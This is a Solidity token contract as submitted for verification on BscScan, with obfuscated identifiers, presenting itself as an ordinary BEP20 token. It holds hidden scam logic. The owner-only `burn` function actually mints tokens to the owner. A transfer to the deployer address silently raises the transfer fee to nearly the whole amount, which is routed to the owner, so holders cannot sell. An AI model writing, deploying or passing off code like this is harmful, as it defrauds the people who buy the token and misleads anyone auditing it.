/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 05:55 GMT
 */
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract YUVTPKE {
uint256 private  UOQYRZ = 1000000000000000;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "VNFHVV";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "VNFHVV";
address public owner;
uint256 private  UYUIFB = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  FZTBOC = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  GBAEMS = 10000000000000;
uint256 private  GPAPWA = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  NEKKEN = 1000000000000000000;
address private  VLLIQZ = address(0);
address private  OUTJUG = address(0);
uint256 public constant FUFJFE = 99999;
address private  XGPMIV = address(0);
uint256 private  UASYWS = 10000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 private  MTAATM = 1000000000000000000000;
address private  PEYNWP = address(0);
function _getVLLIQZ() private returns (address) {
return VLLIQZ;
}

function _getPEYNWP() private returns (address) {
return PEYNWP;
}

function _getXGPMIV() private returns (address) {
return XGPMIV;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getFZTBOC() private returns (address) {
return FZTBOC;
}

constructor () {
OUTJUG = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getUASYWS() private returns (uint256) {
return UASYWS;
}

function _getUOQYRZ() private returns (uint256) {
return UOQYRZ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tNAWBRW 0");
require(spender != address(0), "fNAWBRW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getGPAPWA() private returns (uint256) {
return GPAPWA;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getMTAATM() private returns (uint256) {
return MTAATM;
}

function _getGBAEMS() private returns (uint256) {
return GBAEMS;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NAWBRW");
require(to != address(0), "NAWBRW");
require(amount <= balanceOf[from], "NAWBRW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* FUFJFE/NEKKEN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==OUTJUG){
NEKKEN = FUFJFE+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getUYUIFB() private returns (uint256) {
return UYUIFB;
}


}